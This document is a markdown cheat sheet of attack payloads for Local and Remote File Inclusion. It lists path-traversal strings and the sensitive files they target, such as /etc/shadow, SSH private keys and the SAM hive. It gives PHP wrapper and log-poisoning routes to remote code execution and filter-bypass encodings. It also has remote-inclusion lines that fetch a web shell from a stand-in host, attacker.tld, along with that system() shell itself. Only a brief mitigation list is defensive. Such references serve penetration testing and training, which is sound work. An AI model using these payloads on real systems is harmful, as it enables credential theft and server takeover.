# File Inclusion (LFI / RFI)

> Local File Inclusion (LFI) and Remote File Inclusion (RFI) allow inclusion of attacker-controlled files into the server's execution context.

## Summary

- [Detection](#detection)
- [LFI Targets — Linux](#lfi-targets--linux)
- [LFI Targets — Windows](#lfi-targets--windows)
- [PHP Wrappers](#php-wrappers)
- [LFI to RCE](#lfi-to-rce)
- [Filter Bypass](#filter-bypass)
- [Remote File Inclusion](#remote-file-inclusion)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=/etc/passwd%00
?page=php://filter/convert.base64-encode/resource=index
```

## LFI Targets — Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/mysql/my.cnf
/etc/ssh/sshd_config
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/maps
/proc/self/fd/0
/proc/self/fd/1
/proc/version
/proc/cpuinfo
/proc/mounts
/proc/net/tcp
/proc/net/arp
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/root/.bash_history
/home/*/.ssh/id_rsa
/home/*/.bash_history
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/var/log/vsftpd.log
/var/www/html/.git/config
/var/www/html/wp-config.php
/var/www/html/configuration.php
```

## LFI Targets — Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\sam
C:\Windows\repair\system
C:\Windows\debug\NetSetup.log
C:\inetpub\logs\LogFiles\
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
C:\boot.ini
```

## PHP Wrappers

### Base64 source disclosure

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### Chained filters

```
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource=index.php
```

### Data wrapper (RCE if `allow_url_include=On`)

```
data://text/plain,<?php system($_GET['c']); ?>&c=id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

### Expect wrapper (RCE if `expect` extension loaded)

```
expect://id
```

### PHP wrappers — ZIP / Phar

```
phar://uploaded.phar/test
zip://uploaded.zip%23shell.php
```

### Input wrapper (POST body as code)

```
php://input    (POST body: <?php system($_GET['c']); ?>)
```

## LFI to RCE

### Log poisoning

1. Make a request with PHP code in User-Agent or Referer:
   ```
   User-Agent: <?php system($_GET['c']); ?>
   ```
2. Include the log:
   ```
   ?file=/var/log/apache2/access.log&c=id
   ```

### `/proc/self/environ`

If the env var is reflected (older PHP/CGI):
```
User-Agent: <?php system($_GET['c']); ?>
?file=/proc/self/environ&c=id
```

### Session file

`/var/lib/php/sessions/sess_<PHPSESSID>` — inject code into a session value, then include.

### Mail log

Send mail to `<?php system($_GET[0]); ?>@target.tld`, include `/var/log/mail.log`.

### Phar deserialization (PHP < 8.0 with file ops)

If the app calls `file_exists()` / `stat()` / `fopen()` on a user-controlled path, `phar://` triggers metadata deserialization → POP chain → RCE.

### LFI → SSH key → SSH login

Read `/home/user/.ssh/id_rsa`.

## Filter Bypass

### Null byte (PHP < 5.3.4, no patch)

```
?file=/etc/passwd%00
?file=../../etc/passwd%00.png
```

### Path truncation (legacy PHP)

```
?file=/etc/passwd/././././././././././././././././././././././././
?file=../../../../../../../../etc/passwd......(x4096)
```

### Double encoding

```
?file=..%252f..%252f..%252fetc%252fpasswd
```

### Override `../` filter

```
....//
..../\
%2e%2e%2f
..%c0%af
..%252f
```

### Filter bypass with wrapper

If `../` is filtered:

```
php://filter/convert.base64-encode/resource=/etc/passwd
```

### Absolute path

```
?file=/etc/passwd     (no traversal needed when filter only checks for "../")
```

## Remote File Inclusion

Requires `allow_url_include=On` and `allow_url_fopen=On` in PHP:

```
?file=http://attacker.tld/shell.txt
?file=https://attacker.tld/shell.txt
?file=ftp://attacker.tld/shell.txt
?file=//attacker.tld/shell.txt        (protocol-relative)
?file=\\attacker.tld\share\shell.txt  (SMB on Windows)
```

Shell hosted as `shell.txt`:

```php
<?php system($_GET['c']); ?>
```

## Mitigation

- Never include files based on user input. Use **fixed allow-list** mapping IDs → server paths.
- Disable `allow_url_include` and `allow_url_fopen` if not strictly needed.
- Strip `..` and absolute paths; canonicalize then verify the path is under the intended base directory.
- Run the web user with no read access outside the doc-root.
- Disable PHP wrappers globally if not needed.

## References

- [OWASP — LFI](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger — File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [HackTricks — LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
